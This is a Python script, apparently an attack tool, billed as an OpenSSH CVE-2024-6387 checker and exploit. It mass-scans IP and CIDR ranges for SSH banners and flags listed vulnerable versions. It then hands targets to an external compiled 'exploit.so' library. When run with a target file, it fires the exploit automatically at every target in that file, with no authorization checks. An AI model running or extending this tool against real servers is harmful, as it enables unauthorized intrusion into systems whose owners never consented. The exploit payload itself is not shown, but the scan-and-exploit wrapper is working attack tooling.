import socket
import argparse
import ipaddress
import threading
from queue import Queue
import csv
import json
import ctypes

# After compiling your 'exploit.so', these parts are uncommented to enable exploitation.

# Load the shared library
lib = ctypes.CDLL('./exploit.so')

# Define the argument and return types
lib.exploit_vulnerability.argtypes = [ctypes.c_char_p, ctypes.c_int]
lib.exploit_vulnerability.restype = ctypes.c_int


class Color:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    RESET = '\033[0m'


def is_port_open(ip, port, timeout):
    """Check if a port is open on a given IP."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((ip, port))
        sock.close()
        return True
    except:
        return False


def get_ssh_banner(ip, port, timeout):
    """Retrieve SSH banner from a target."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        banner = sock.recv(1024).decode().strip()
        sock.close()
        return banner
    except Exception as e:
        return str(e)


def check_vulnerability(ip, port, timeout, result_queue):
    """Check if a server is running a vulnerable version of OpenSSH."""
    if not is_port_open(ip, port, timeout):
        result_queue.put((ip, port, 'closed', "Port closed"))
        return

    banner = get_ssh_banner(ip, port, timeout)
    vulnerable_versions = [
        'OpenSSH_8.5p1', 'OpenSSH_8.6p1', 'OpenSSH_8.7p1',
        'OpenSSH_8.8p1', 'OpenSSH_8.9p1', 'OpenSSH_9.0p1',
        'OpenSSH_9.1p1', 'OpenSSH_9.2p1', 'OpenSSH_9.3p1',
        'OpenSSH_9.4p1', 'OpenSSH_9.5p1', 'OpenSSH_9.6p1',
        'OpenSSH_9.7p1'
    ]

    if any(version in banner for version in vulnerable_versions):
        result_queue.put((ip, port, 'vulnerable', f"(running {banner})"))
    else:
        result_queue.put((ip, port, 'not_vulnerable', f"(running {banner})"))


def scan_ports(targets, timeout, output_format=None, output_file=None):
    """Scan ports on multiple targets and optionally write results to a file."""
    ips_ports = []
    for target in targets:
        try:
            with open(target, 'r') as file:
                ips_ports.extend(file.readlines())
        except IOError:
            if '/' in target:
                try:
                    network = ipaddress.ip_network(target, strict=False)
                    ips_ports.extend([f"{ip}:22" for ip in network.hosts()])
                except ValueError:
                    print(f"{Color.RED}[-] Invalid: {target}{Color.RESET}")
            else:
                ips_ports.append(target.strip())

    result_queue = Queue()
    threads = []

    for ip_port in ips_ports:
        ip_port = ip_port.strip()
        if ':' in ip_port:
            ip, port = ip_port.split(':')
            port = int(port)
        else:
            ip = ip_port
            port = 22

        thread = threading.Thread(target=check_vulnerability, args=(ip, port, timeout, result_queue))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    total_scanned = len(ips_ports)
    closed_ports = 0
    not_vulnerable = []
    vulnerable = []

    while not result_queue.empty():
        ip, port, status, message = result_queue.get()
        if status == 'closed':
            closed_ports += 1
        elif status == 'vulnerable':
            vulnerable.append((ip, port, message))
        elif status == 'not_vulnerable':
            not_vulnerable.append((ip, port, message))
        else:
            print(f"{Color.YELLOW}⚠️ [!] Server at {ip}:{port} is {message}{Color.RESET}")

    print(f"\n{Color.GREEN}No vulnerable server found: {len(not_vulnerable)}{Color.RESET}\n")
    for ip, port, msg in not_vulnerable:
        print(f"{Color.GREEN}[+] No Vulnerable server found at {ip}:{port} {msg}{Color.RESET}")
    for ip, port, msg in vulnerable:
        print(f"{Color.RED}[+] Vulnerable server found at {ip}:{port} {msg}{Color.RESET}")
    print("\n")
    print(f"""{Color.CYAN}Summary{Color.RESET}:

    Total targets: {Color.GREEN}{total_scanned}{Color.RESET} servers 
    Vulnerable: {Color.RED}{len(vulnerable)}{Color.RESET} servers 
    Not vulnerable: {Color.GREEN}{len(not_vulnerable)}{Color.RESET} servers
    Closed ports: {Color.YELLOW}{closed_ports}{Color.RESET} servers""")

    if output_format and output_file:
        if output_format == 'csv':
            with open(output_file, 'w', newline='') as csvfile:
                csv_writer = csv.writer(csvfile)
                csv_writer.writerow(['IP', 'Port', 'Status', 'Message'])
                for ip, port, msg in not_vulnerable:
                    csv_writer.writerow([ip, port, 'Not vulnerable', msg])
                for ip, port, msg in vulnerable:
                    csv_writer.writerow([ip, port, 'Vulnerable', msg])
                csvfile.flush()
            print(f"\n{Color.CYAN}✅ Results saved to {output_file} in CSV format.{Color.RESET}")

        elif output_format == 'txt':
            with open(output_file, 'w') as txtfile:
                txtfile.write(f"No vulnerable server found: {len(not_vulnerable)}\n")
                for ip, port, msg in not_vulnerable:
                    txtfile.write(f"   [+] No vulnerable server found at {ip}:{port} {msg}\n")
                txtfile.write(f"\nVulnerable servers found: {len(vulnerable)}\n")
                for ip, port, msg in vulnerable:
                    txtfile.write(f"   [+] Vulnerable server found at {ip}:{port} {msg}\n")
            print(f"\n{Color.CYAN}✅ Results saved to {output_file} in TXT format.{Color.RESET}")

        elif output_format == 'json':
            output_dict = {
                'No vulnerable server found': [{f"{ip}:{port}": msg} for ip, port, msg in not_vulnerable],
                'Vulnerable servers found': [{f"{ip}:{port}": msg} for ip, port, msg in vulnerable]
            }
            with open(output_file, 'w') as jsonfile:
                json.dump(output_dict, jsonfile, indent=4)
            print(f"\n{Color.CYAN}✅ Results saved to {output_file} in JSON format.{Color.RESET}")


def exploit_vulnerability(targets):
    """Exploit vulnerability on vulnerable servers."""
    print(f"{Color.GREEN}Exploiting vulnerabilities...{Color.RESET}")

    targets_str = ','.join(targets)

    for target in targets:
        if ':' in target:
            ip, port = target.split(':')
            port = int(port)
        else:
            ip = target
            port = 22

        # Call the C function
        result = lib.exploit_vulnerability(ip.encode(), port)

        # Check the result if necessary
        if result == 0:
            print(f"Exploitation successful for {ip}:{port}!")
        else:
            print(f"Exploitation failed for {ip}:{port}.")


def main():
    banner = f"""{Color.RED}
       ███╗   ███╗██╗███████╗████████╗
       ████╗ ████║██║██╔════╝╚══██╔══╝
       ██╔████╔██║██║███████╗   ██║   
       ██║╚██╔╝██║██║╚════██║   ██║   
       ██║ ╚═╝ ██║██║███████║   ██║   
       ╚═╝     ╚═╝╚═╝╚══════╝   ╚═╝   
      OpenSSH CVE-2024-6387 Vulnerability Checker & Exploit
      {Color.CYAN}Author: M1st {Color.RESET} 
"""
    print(banner)

    parser = argparse.ArgumentParser(description='OpenSSH Vulnerability Checker & Exploit')
    parser.add_argument('targets', metavar='TARGETS', type=str, nargs='*',
                        help='Targets to scan, can be IP, IP:PORT, CIDR, or file paths.')
    parser.add_argument('-f', '--file', metavar='FILE', type=str, help='File with targets to scan.')
    parser.add_argument('-o', '--output', metavar='OUTPUT', type=str, help='Output file name.')
    parser.add_argument('--format', metavar='FORMAT', type=str, choices=['txt', 'csv', 'json'],
                        help='Output file format.')
    parser.add_argument('-t', '--timeout', metavar='TIMEOUT', type=int, default=5,
                        help='Connection timeout in seconds (default: 5).')
    parser.add_argument('-x', '--exploit', action='store_true',
                        help='Exploit the vulnerability on identified vulnerable servers.')

    args = parser.parse_args()

    # Handle the file parameter to scan and exploit automatically
    if args.file:
        with open(args.file, 'r') as file:
            targets_from_file = [line.strip() for line in file.readlines()]
        scan_ports(targets_from_file, args.timeout, args.format, args.output)
        exploit_vulnerability(targets_from_file)
    else:
        scan_ports(args.targets, args.timeout, args.format, args.output)
        if args.exploit:
            exploit_vulnerability(args.targets)


if __name__ == "__main__":
    main()

